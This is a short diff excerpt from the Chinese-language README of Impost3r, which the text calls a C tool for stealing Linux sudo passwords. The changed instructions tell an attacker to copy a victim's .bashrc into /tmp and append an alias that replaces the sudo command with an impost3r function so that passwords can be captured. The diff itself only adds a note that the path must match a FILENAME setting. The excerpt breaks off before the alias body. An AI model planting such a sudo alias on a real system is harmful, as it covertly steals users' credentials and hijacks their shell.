@@ -31,7 +31,7 @@ Impost3r是一个利用C语言编写,用来窃取linux下sudo密码的工具
 
 - 拷贝一份用户的.bashrc```cp ～/.bashrc /tmp/```，并将这份副本放在攻击者自定义的路径下(本例中放置在/tmp/目录下，攻击者可以修改)
 
-- 修改用户根目录下的.bashrc(～/.bashrc)，在最后一行添加如下语句：
+- 修改用户根目录下的.bashrc(～/.bashrc)，在最后一行添加如下语句(其中“/tmp/.impost3r”需要与下面的FILENAME保持一致)：
 
 ```
 alias sudo='impost3r() {
